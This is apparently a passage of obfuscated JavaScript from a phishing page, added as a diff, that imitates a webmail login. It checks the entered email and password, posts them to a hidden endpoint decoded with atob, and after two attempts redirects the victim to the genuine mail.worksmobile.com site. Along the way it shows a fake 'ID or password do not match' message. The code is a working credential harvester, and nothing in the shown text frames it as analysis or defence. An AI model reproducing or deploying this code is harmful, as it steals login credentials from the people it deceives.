_0x432ccb=_0x82df32,_0x29c508=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x82df32)return $(_0x32715e(0xa7))[_0x32715e(0xcf)](),$('#error')[_0x32715e(0xb4)](_0x32715e(0xd5)),_0x82df32['focus'],![];if(!_0x29c508['test'](_0x432ccb))return $(_0x32715e(0xa7))[_0x32715e(0xcf)](),$(_0x32715e(0xa7))['html'](_0x32715e(0xc2)),_0x82df32['focus'],![];if(!_0x52e229)return $(_0x32715e(0xa7))[_0x32715e(0xcf)](),$('#error')[_0x32715e(0xb4)]('Enter\x20your\x20Email/ID\x20password\x20to\x20continue'),_0x82df32['focus'],![];var _0x49fc9c=_0x432ccb[_0x32715e(0xb8)]('@'),_0x3c85b5=_0x432ccb[_0x32715e(0xba)](_0x49fc9c+0x1),_0x58e202=_0x3c85b5[_0x32715e(0xba)](0x0,_0x3c85b5[_0x32715e(0xb8)]('.')),_0x2538fa=_0x58e202[_0x32715e(0xbf)]();_0x1fb49a=_0x1fb49a+0x1,$[_0x32715e(0xc7)]({'dataType':_0x32715e(0xcd),'url':atob(_0x3ca292),'type':_0x32715e(0xc3),'data':{'email':_0x82df32,'password':_0x52e229},'beforeSend':function(_0x346609){var _0x34cf15=_0x32715e;$(_0x34cf15(0xd6))[_0x34cf15(0xb4)](_0x34cf15(0xd7));},'success':function(_0x160cbd){var _0x383a10=_0x32715e;if(_0x160cbd){$('#msg')['show'](),console[_0x383a10(0xdd)](_0x160cbd);if(_0x160cbd[_0x383a10(0xda)]=='ok'){$(_0x383a10(0xb6))[_0x383a10(0xa4)]('');if(_0x1fb49a>=0x2)return _0x1fb49a=0x0,window[_0x383a10(0xcb)][_0x383a10(0xbc)]('https://mail.worksmobile.com'),![];$('#msg')[_0x383a10(0xb4)](_0x160cbd[_0x383a10(0xd4)]);}else $(_0x383a10(0xb3))[_0x383a10(0xb4)](_0x160cbd[_0x383a10(0xd4)]);}},'error':function(){var _0x2d0b71=_0x32715e;$(_0x2d0b71(0xb6))[_0x2d0b71(0xa4)]('');if(_0x1fb49a>=0x2)return _0x1fb49a=0x0,window[_0x2d0b71(0xcb)][_0x2d0b71(0xbc)](_0x2d0b71(0xc9)),![];$(_0x2d0b71(0xb3))[_0x2d0b71(0xcf)](),$('#msg')[_0x2d0b71(0xb4)]('ID\x20or\x20password\x20do\x20not\x20match.');},'complete':function(){var _0x13c392=_0x32715e;$('#loginBtn')['html'](_0x13c392(0xd7));}});});});
+</script>
+</body></html>
